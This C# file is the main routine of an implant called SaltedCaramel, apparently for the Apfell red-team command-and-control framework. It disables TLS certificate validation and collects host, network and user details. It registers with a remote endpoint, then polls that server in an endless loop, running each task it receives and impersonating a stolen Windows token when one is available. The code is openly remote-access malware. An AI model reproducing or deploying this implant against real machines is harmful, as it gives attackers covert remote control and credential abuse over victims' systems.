﻿using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Threading;

namespace SaltedCaramel
{
    class SaltedCaramel
    {
        static void Main(string[] args)
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SaltedCaramelImplant implant = new SaltedCaramelImplant();
            implant.uuid = args[2]; // Generated when payload is created in Apfell
            implant.endpoint = args[0] + "/api/v1.3/";
            implant.host = Dns.GetHostName();
            implant.ip = Dns.GetHostEntry(implant.host) // Necessary because the host may have more than one interface
                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            implant.domain = Environment.UserDomainName;
            implant.os = Environment.OSVersion.VersionString;
            implant.architecture = "x64";
            using (Process proc = Process.GetCurrentProcess())
                implant.pid = proc.Id;
            implant.sleep = 5000;
            implant.user = Environment.UserName;

            implant.PSK = Convert.FromBase64String(args[1]);

            implant.InitializeImplant();

            while (true)
            {
                SaltedCaramelTask task = implant.CheckTasking();
                if (task.command != "none")
                {
                    if (implant.hasAlternateToken() == true)
                    {
                        using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
                        using (WindowsImpersonationContext context = ident.Impersonate())
                            task.DispatchTask(implant);
                    }
                    else
                        ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                }
                Thread.Sleep(implant.sleep);
            }
        }
    }
}
